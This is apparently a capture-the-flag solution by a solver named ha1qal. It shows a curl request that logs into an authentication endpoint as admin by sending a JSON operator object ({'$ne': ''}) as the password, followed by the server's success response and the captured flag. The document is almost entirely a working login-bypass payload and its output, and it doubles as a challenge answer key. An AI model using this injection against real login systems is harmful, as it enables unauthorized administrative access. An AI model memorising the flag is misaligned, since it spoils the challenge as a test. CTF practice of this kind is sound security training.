```
curl -X POST http://18.212.136.134:5200/api/authenticate \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$ne": ""}, "remember": true}'
{"flag":"FLAG{py7h0n_typ3_c03rc10n_byp4ss}","message":"Authentication successful","role":"admin","success":true,"user":"admin"}
```
Flag: FLAG{py7h0n_typ3_c03rc10n_byp4ss}

Solved by: ha1qal
